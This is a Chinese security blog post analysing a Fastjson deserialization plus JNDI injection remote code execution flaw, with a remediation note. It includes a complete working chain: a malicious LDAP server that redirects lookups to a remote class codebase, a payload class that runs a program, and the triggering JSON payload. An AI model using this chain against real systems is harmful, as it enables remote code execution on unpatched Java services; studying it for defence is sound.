@@ -1,0 +1,544 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Fastjson 反序列化 + JNDI 注入 实现远程代码执行 | Gridea</title>
+<link rel="shortcut icon" href="https://c0n6w3i.github.io//favicon.ico?v=1628818360718">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://c0n6w3i.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Fastjson 反序列化 + JNDI 注入 实现远程代码执行 | Gridea - Atom Feed" href="https://c0n6w3i.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="0x01 简介
+Fastjson 是一个 Java 编写的 JSON 库, 可以用来将 String 转成 Java Object.
+0x02 漏洞概述
+这次是一个由于错误配置引起的的反序列化漏洞, 效果和当年 CVE-2017-18349..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://c0n6w3i.github.io/">
+  <img class="avatar" src="https://c0n6w3i.github.io//images/avatar.png?v=1628818360718" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Fastjson 反序列化 + JNDI 注入 实现远程代码执行
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-06-07
+              </span>
+              <span>
+                11 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="0x01-简介">0x01 简介</h2>
+<p>Fastjson 是一个 Java 编写的 JSON 库, 可以用来将 String 转成 Java Object.</p>
+<h2 id="0x02-漏洞概述">0x02 漏洞概述</h2>
+<p>这次是一个由于错误配置引起的的反序列化漏洞, 效果和当年 CVE-2017-18349 差不多. AutoTypeSupport 是 true 的话就可以触发.</p>
+<p>此处演示使用 AutoType 功能实现 JNDI(Java Naming and Directory Interface) 注入, 从而实现RCE.</p>
+<p>当调用 <code>com.alibaba.fastjson.JSON.parse(json);</code> 时 string 会被 DefaultJSONParser.parse 函数解析</p>
+<pre><code class="language-java">    /**
+     *
+     * @since 1.2.38
+     */
+    public static Object parse(String text, ParserConfig config, int features) {
+        if (text == null) {
+            return null;
+        }
+
+        DefaultJSONParser parser = new DefaultJSONParser(text, config, features);
+        Object value = parser.parse();
+
+        parser.handleResovleTask(value);
+
+        parser.close();
+
+        return value;
+    }
+</code></pre>
+<p>之后 string 被传入 parseObject 函数</p>
+<pre><code class="language-java">    public Object parse(Object fieldName) {
+        final JSONLexer lexer = this.lexer;
+        switch (lexer.token()) {
+            // ... //
+            case LBRACE:
+                JSONObject object = new JSONObject(lexer.isEnabled(Feature.OrderedField));
+                return parseObject(object, fieldName);
+            // ... //
+</code></pre>
+<p>parseObject 函数会识别特殊的 key, 如果 key 是 @type, 该函数就会运行 config.checkAutoType</p>
+<pre><code class="language-java">                if (key == JSON.DEFAULT_TYPE_KEY
+                        &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) {
+                    String typeName = lexer.scanSymbol(symbolTable, '&quot;');
+                    // ... //
+                    Class&lt;?&gt; clazz = null;
+                    if (object != null
+                            &amp;&amp; object.getClass().getName().equals(typeName)) {
+                        clazz = object.getClass();
+                    } else {
+                        // ... //
+                        if (!allDigits) {
+                            clazz = config.checkAutoType(typeName, null, lexer.getFeatures());
+                        }
+                    }
+
+</code></pre>
+<p>checkAutoType 首先会 hash ClassName, 然后检查 hash 值不在白名单, acceptHashCodes 和 denyHashCodes 里. 经过各种检查后, class 将会被读入 clazz 变量</p>
+<pre><code class="language-java">        final int mask = Feature.SupportAutoType.mask;
+        boolean autoTypeSupport = this.autoTypeSupport
+                || (features &amp; mask) != 0
+                || (JSON.DEFAULT_PARSER_FEATURE &amp; mask) != 0;
+
+        if (autoTypeSupport || jsonType || expectClassFlag) {
+            boolean cacheClass = autoTypeSupport || jsonType;
+            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
+        }
+        // ... //
+        JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
+
+</code></pre>
+<p>之后检查 autoTypeSupport, 如果没开的话就会抛出异常, 如果开了的话就会返回 clazz.</p>
+<pre><code class="language-java">        if (!autoTypeSupport) {
+            throw new JSONException(&quot;autoType is not support. &quot; + typeName);
+        }
+</code></pre>
+<p>最后会反序列化 clazz, 会在 JavaBeanDeserializer.class 里赋值, 然后返回 object. 一些类的method在deserialze的时候就会被执行了.</p>
+<pre><code class="language-java">                    ObjectDeserializer deserializer = config.getDeserializer(clazz);
+                    Class deserClass = deserializer.getClass();
+                    if (JavaBeanDeserializer.class.isAssignableFrom(deserClass)
+                            &amp;&amp; deserClass != JavaBeanDeserializer.class
+                            &amp;&amp; deserClass != ThrowableDeserializer.class) {
+                        this.setResolveStatus(NONE);
+                    } else if (deserializer instanceof MapDeserializer) {
+                        this.setResolveStatus(NONE);
+                    }
+                    Object obj = deserializer.deserialze(this, clazz, fieldName);
+                    return obj;
+</code></pre>
+<p>如果有 $ref 的话, parse 完之后会运行 handleResovleTask 函数. 然后运行 eval 函数</p>
+<pre><code class="language-java">                if (refValue == null) {
+                    try {
+                        JSONPath jsonpath = JSONPath.compile(ref);
+                        if (jsonpath.isRef()) {
+                            refValue = jsonpath.eval(value);
+                        }
+                    } catch (JSONPathException ex) {
+                        // skip
+                    }
+                }
+</code></pre>
+<p>eval 函数会运行getPropertyValue 函数 经过各种加载之后会执行 org.apache.shiro.jndi.JndiObjectFactory 的 getInstance 函数, 进而执行 lookup 函数.</p>
+<pre><code class="language-java">    public T getInstance() {
+        try {
+            if(requiredType != null) {
+                return requiredType.cast(this.lookup(resourceName, requiredType));
+            } else {
+                return (T) this.lookup(resourceName);
+            }
+</code></pre>
+<p>从这里开始就是 JNDI 注入攻击了</p>
+<p>可以配置一个含有恶意代码的 Naming/Directory service 然后给 resourceName 赋值成恶意代码的 URL. 当执行 lookup 时, 程序会接收并运行恶意代码.</p>
+<h2 id="0x03-影响版本">0x03 影响版本</h2>
+<p>Fastjson &lt;= 1.2.66</p>
+<h2 id="0x04-环境搭建">0x04 环境搭建</h2>
+<p>目录结构：<br>
+<img src="https://c0n6w3i.github.io//post-images/1591627649611.png" alt="" loading="lazy"></p>
+<p>pom 文件:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+
+&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+  xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;
+  &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+  &lt;groupId&gt;test&lt;/groupId&gt;
+  &lt;artifactId&gt;test&lt;/artifactId&gt;
+  &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+
+  &lt;name&gt;test&lt;/name&gt;
+  &lt;!-- FIXME change it to the project's website --&gt;
+  &lt;url&gt;http://www.example.com&lt;/url&gt;
+
+  &lt;properties&gt;
+    &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;
+    &lt;maven.compiler.source&gt;1.7&lt;/maven.compiler.source&gt;
+    &lt;maven.compiler.target&gt;1.7&lt;/maven.compiler.target&gt;
+  &lt;/properties&gt;
+
+  &lt;dependencies&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;junit&lt;/groupId&gt;
+      &lt;artifactId&gt;junit&lt;/artifactId&gt;
+      &lt;version&gt;4.11&lt;/version&gt;
+      &lt;scope&gt;test&lt;/scope&gt;
+    &lt;/dependency&gt;
+
+    &lt;!-- ldap --&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+      &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+      &lt;version&gt;3.1.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;!-- fastjson --&gt;
+    &lt;dependency&gt;
+      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;
+      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;
+      &lt;version&gt;1.2.66&lt;/version&gt;
+    &lt;/dependency&gt;
+
+    &lt;dependency&gt;
+      &lt;groupId&gt;org.apache.shiro&lt;/groupId&gt;
+      &lt;artifactId&gt;shiro-core&lt;/artifactId&gt;
+      &lt;version&gt;1.5.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    
+  &lt;/dependencies&gt;
+
+
+
+  &lt;build&gt;
+    &lt;pluginManagement&gt;&lt;!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) --&gt;
+      &lt;plugins&gt;
+        &lt;!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-clean-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.1.0&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.8.0&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-surefire-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.22.1&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-install-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.5.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-deploy-plugin&lt;/artifactId&gt;
+          &lt;version&gt;2.8.2&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle --&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-site-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.7.1&lt;/version&gt;
+        &lt;/plugin&gt;
+        &lt;plugin&gt;
+          &lt;artifactId&gt;maven-project-info-reports-plugin&lt;/artifactId&gt;
+          &lt;version&gt;3.0.0&lt;/version&gt;
+        &lt;/plugin&gt;
+      &lt;/plugins&gt;
+    &lt;/pluginManagement&gt;
+  &lt;/build&gt;
+&lt;/project&gt;
+
+</code></pre>
+<p>使用下面的代码搭建一个 LDAP 服务, RMI 也行, 不过高级JDK 对 RMI 限制很多.<br>
+https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</p>
+<p>此处用到 server 代码如下 (代码来自于上面的链接，侵删)</p>
+<pre><code class="language-java">package test;
+
+import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+
+public class LdapServer {
+
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+
+    public static void main (String[] args) {
+
+        String url = &quot;http://127.0.0.1:8000/#Notepad&quot;;
+        int port = 1234;
+
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                    &quot;listen&quot;,
+                    InetAddress.getByName(&quot;0.0.0.0&quot;),
+                    port,
+                    ServerSocketFactory.getDefault(),
+                    SocketFactory.getDefault(),
+                    (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+            ds.startListening();
+
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+
+        /**
+         *
+         */
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+
+
+        /**
+         * {@inheritDoc}
+         *
+         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+         */
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+
+        }
+
+
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;Notepad&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);
+            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);
+            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+    }
+}
+</code></pre>
+<p>需要远程执行的代码：</p>
+<pre><code class="language-java">public class Notepad {
+    static {
+      try {
+        System.out.println(&quot;run notepad...&quot;);
+        Runtime.getRuntime().exec(&quot;C:\\Windows\\System32\\notepad.exe&quot;);
+      } catch (Throwable e) {
+        e.printStackTrace();
+      }
+    }
+  }
+</code></pre>
+<h2 id="0x05-漏洞复现">0x05 漏洞复现</h2>
+<p>Poc：<br>
+https://github.com/threedr3am/learnjavabug/tree/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce</p>
+<p>此处分析用到的payload (代码来自于上面的链接，侵删)</p>
+<pre><code class="language-JSON">{
+    &quot;@type&quot;: &quot;org.apache.shiro.jndi.JndiObjectFactory&quot;,
+    &quot;resourceName&quot;: &quot;ldap://127.0.0.1:1234/1&quot;,
+    &quot;test&quot;: {
+        &quot;$ref&quot;: &quot;$.instance&quot;
+    }
+}
+</code></pre>
+<p>Victim代码:</p>
+<pre><code class="language-java">package poc;
+
+import com.alibaba.fastjson.JSON;
+import com.alibaba.fastjson.parser.ParserConfig;
+public class App {
+  public static void main(String[] args) throws Exception {
+    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+    String str = &quot;{\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;ldap://127.0.0.1:1234/1\&quot;,\&quot;test\&quot;:{\&quot;$ref\&quot;:\&quot;$.instance\&quot;}}&quot;;
+    JSON.parse(str);
+  }
+}
+</code></pre>
+<p>先运行 server 代码, 再运行 victim 代码<br>
+运行结果:</p>
+<figure data-type="image" tabindex="1"><img src="https://c0n6w3i.github.io//post-images/1591627692333.jpg" alt="" loading="lazy"></figure>
+<h2 id="0x06-修复方式">0x06 修复方式</h2>
+<p>AutoType 默认关闭, 不过要用到的话需要确保 AutoTypeSupport 设置正确, 删除 <code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code></p>
+<h2 id="参考链接">参考链接：</h2>
+<p>https://www.smi1e.top/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E4%B9%8Bjndi%E6%B3%A8%E5%85%A5/</p>
+<p>https://github.com/threedr3am/learnjavabug/tree/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E7%AE%80%E4%BB%8B">0x01 简介</a></li>
+<li><a href="#0x02-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0">0x02 漏洞概述</a></li>
+<li><a href="#0x03-%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC">0x03 影响版本</a></li>
+<li><a href="#0x04-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">0x04 环境搭建</a></li>
+<li><a href="#0x05-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0">0x05 漏洞复现</a></li>
+<li><a href="#0x06-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F">0x06 修复方式</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接：</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://c0n6w3i.github.io/post/fang-wen-kong-zhi-policy-enforcement-point-za-tan/">
+              <h3 class="post-title">
+                访问控制 Policy Enforcement Point 杂谈
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://c0n6w3i.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
